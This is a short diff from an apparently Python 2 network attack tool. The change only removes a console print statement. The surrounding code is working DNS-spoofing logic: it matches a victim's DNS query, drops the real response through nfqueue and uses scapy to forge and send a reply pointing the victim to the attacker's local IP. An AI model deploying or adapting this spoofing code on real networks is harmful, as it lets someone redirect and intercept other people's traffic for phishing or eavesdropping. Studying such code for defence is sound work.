@@ -135,7 +135,6 @@ class Parser():
 			if args.dnsspoof in dns_layer.qd.qname:
 				logger.write('[+] DNS request for '+args.dnsspoof+' found; dropping packet and injecting spoofed one to '+localIP+'\n')
 				payload.set_verdict(nfqueue.NF_DROP)
-				print G+'[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+W+localIP
 				logger.write('[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+localIP+'\n')
 				p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=localIP))
 				send(p)
